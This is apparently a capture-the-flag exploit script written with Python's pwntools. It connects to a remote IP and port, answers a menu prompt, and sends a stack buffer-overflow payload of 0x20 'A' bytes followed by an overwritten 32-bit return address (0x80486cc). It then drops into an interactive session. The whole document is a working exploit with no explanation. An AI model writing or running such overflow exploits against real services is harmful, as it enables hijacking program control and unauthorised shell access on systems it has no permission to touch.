from pwn import  *
io = remote("61.147.171.105",63909)
payload = b'A'*0x20 + p32(0x80486cc)
io.sendlineafter(">","hhh")
io.sendlineafter(">",payload)
io.interactive()
